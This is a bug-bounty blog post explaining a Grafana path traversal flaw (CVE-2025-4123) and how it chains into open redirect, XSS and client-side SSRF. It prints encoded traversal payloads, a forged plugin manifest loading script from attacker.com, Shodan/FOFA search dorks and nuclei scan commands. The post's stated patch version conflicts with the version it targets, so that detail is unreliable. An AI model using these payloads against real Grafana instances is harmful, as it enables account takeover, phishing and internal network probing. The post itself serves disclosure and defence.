How One Path Traversal in Grafana Unleashed XSS, Open Redirect and SSRF (CVE-2025â€“4123)
Abusing Client Path Traversal to Chain XSS, SSRF and Open Redirect in Grafana
coffinxp
coffinxp

Following
4 min read
Â·
Jun 3, 2025
281


4






Introduction
A high-severity security vulnerability has been discovered in Grafana, identified as CVE-2025â€“4123, which combines client path traversal and open redirect issues to enable cross-site scripting (XSS) to account takeover.

In this article, iâ€™ll explain the CVE-2025â€“4123 vulnerability, show how it can be exploited and share tips to fix it. Whether youâ€™re a bug bounty hunter, security engineer or developer itâ€™s important to understand this issue.

What is Grafana ?
Grafana is an open-source analytics and visualization platform used to monitor and display metrics from various data sources like Prometheus, InfluxDB, MySQL and more. Itâ€™s widely used for creating interactive dashboards and setting up alerts for infrastructure and application monitoring

Root Cause Analysis
Grafanaâ€™s frontend does not properly normalize or sanitize URL paths used for plugin loading and navigation. This allows encoded path traversal sequences (../, backslashes, percent-encoding) to break out of intended directories and inject attacker-controlled domains or internal IPs.

This flawed path handling leads to:

XSS: Loading attacker-controlled scripts via malicious plugin manifests using path traversal.
Open Redirect: Redirecting users to external sites through crafted traversal URLs.
Client-Side SSRF: Forcing requests to internal or metadata URLs by abusing plugin resource loading.
The root cause is missing strict path validation and normalization in client-side routing and resource loading.

Exploitation Techniques
Letâ€™s explore how each attack vector can be exploited through this vulnerability, from injecting malicious scripts to redirecting users and accessing internal services.

Open Redirect via Path Traversal
Grafanaâ€™s client-side path handling can be abused to perform open redirects by leveraging encoded path traversal and backslash bypass techniques. The application fails to properly validate or normalize deeply encoded paths, allowing attackers to smuggle external URLs into internal routing logic.

https://domain.com/public/..%2F%5coast.pro%2F%3f%2F..%2F..
This tricks Grafana into treating the external domain (oast.pro) as part of its internal routing logic. When a user clicks on this crafted link, it appears to be from a trusted Grafana instance but silently redirects them to a malicious external site perfect for phishing, session theft, or malware delivery.

Account Takeover through XSS
This vulnerability doesnâ€™t just allow open redirects. it can also be abused to achieve full Cross-Site Scripting (XSS) by loading malicious JavaScript through a forged plugin configuration.

To simulate the exploit, attackers can host their own server containing the necessary JavaScript and a crafted plugin.json file like this:

{
    "name": "ExploitPluginReq",
    "type": "app",
    "id": "grafana-lokiexplore-app",
    "enabled": true,
    "pinned": true,
    "autoEnabled": true,
    "module": "http://attacker.com/file?js=file", //malicious js file
    "baseUrl": "public/plugins/grafana-lokiexplore-app",
    "info": {
        "author": {...}
    }
    ...
}
Then, load the following route:

/a/..%2f..%2f..%2fpublic%2f..%252f%255Cattacker.com%252f%253Fp%252f..%252f..%23/explore
This crafted route exploits the client-side path traversal, allowing Grafana to treat the external domain as a local plugin, effectively loading and executing the remote malicious JavaScript.

SSRF via Internal Path Abuse
Grafanaâ€™s plugin loading mechanism can be tricked into fetching resources from internal services like 127.0.0.1 by abusing client-side path traversal. By encoding the path to bypass validation, attackers can force the frontend to request internal URLs.

/a/..%2f..%2f..%2fpublic%2f..%252f%255C127.0.0.1%252f%253Fp%252f..%252f..%23/explore
This payload makes Grafana treat 127.0.0.1 as a plugin source, resulting in client-side SSRF, useful for probing internal services or exfiltrating data from restricted endpoints.

Hunting Tips for Bug Bounty
This is a goldmine for bug bounty hunters. Grafana instances are often exposed on public dashboards via tools like Shodan, fofa or Censys. Hereâ€™s how you can hunt them down using Shodan and FOFA:

Shodan Search
hostname:"domain.com" title:"Grafana"
product:"Grafana"

Fofa Search
app="Grafana"
domain="domain.com" && "Grafana"
domain="domain.com" && "Grafana" && icon_hash="2123863676"
app="Grafana" && (body="Grafana v11.6.0")

CVE 2025â€“4123 Nuclei template
Quickly identify Grafana instances vulnerable to CVE-2025â€“4123 by using nuclei template:

echo domain.com | nuclei -t /nuclei-templates/http/cves/2025/CVE-2025-4123.yaml
cat domains.txt | nuclei -t /nuclei-templates/http/cves/2025/CVE-2025-4123.yaml

Grafana - XSS / Open Redirect / SSRF via Client Path Traversal
An open redirect vulnerability in Grafana can be chained with other issues, such as XSS or SSRF, to increase impact. Anâ€¦
cloud.projectdiscovery.io

Mitigation
The Grafana team has released a patch in version 11.0.1 that properly:

Normalizes paths
Rejects external domains
Escapes embedded strings
Conclusion
CVE-2025â€“4123 shows how a simple path handling flaw can lead to major issues like XSS, open redirects and client-side SSRF. Itâ€™s a clear reminder of the importance of proper input validation and path normalization especially in complex frontend apps like Grafana.

Upnext: If you found this helpful, youâ€™ll definitely want to check out my article GitHub Recon: The Underrated Technique to Discover High-Impact Leaks in Bug Bounty. Itâ€™s a goldmine of methods to uncover exposed secrets, endpoints and credentials ðŸ‘‡

GitHub Recon: The Underrated Technique to Discover High-Impact Leaks in Bug Bounty
Master the Art of Finding API Keys, Credentials and Sensitive Data in Public Repositories
infosecwriteups.com

Disclaimer
The content provided in this article is for educational and informational purposes only. Always ensure you have proper authorization before conducting security assessments. Use this information responsibly
